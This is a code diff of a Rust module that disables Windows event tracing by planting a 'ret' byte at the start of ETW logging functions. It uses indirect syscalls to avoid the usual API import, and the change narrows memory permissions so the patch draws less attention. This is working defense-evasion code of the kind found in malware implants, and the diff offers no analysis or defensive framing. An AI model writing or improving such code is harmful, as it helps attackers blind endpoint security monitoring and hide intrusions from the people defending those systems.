@@ -46,8 +46,10 @@ mod imp {
     use super::{ORIG_ETW_WRITE, ORIG_ETW_WRITE_EX, ORIG_NT_TRACE};
     use std::sync::atomic::Ordering;
 
-    /// PAGE_EXECUTE_READWRITE (0x40) — local constant to avoid winapi import.
-    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    /// PAGE_READWRITE (0x04) — local constant to avoid winapi import.
+    /// We only need write access to plant the ret byte; the original protection
+    /// (typically PAGE_EXECUTE_READ) is restored immediately after the write.
+    const PAGE_READWRITE: u32 = 0x04;
 
     /// Change memory protection using NtProtectVirtualMemory via indirect
     /// syscall (avoids kernel32!VirtualProtect IAT entry).  Falls back to
@@ -163,7 +165,7 @@ mod imp {
         orig.store(first_byte, Ordering::Relaxed);
 
         let mut old_protect: u32 = 0;
-        if !change_protect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) {
+        if !change_protect(target as *mut _, 1, PAGE_READWRITE, &mut old_protect) {
             return false;
         }
 
@@ -193,7 +195,7 @@ mod imp {
         }
 
         let mut old_protect: u32 = 0;
-        if !change_protect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) {
+        if !change_protect(target as *mut _, 1, PAGE_READWRITE, &mut old_protect) {
             return false;
         }
 
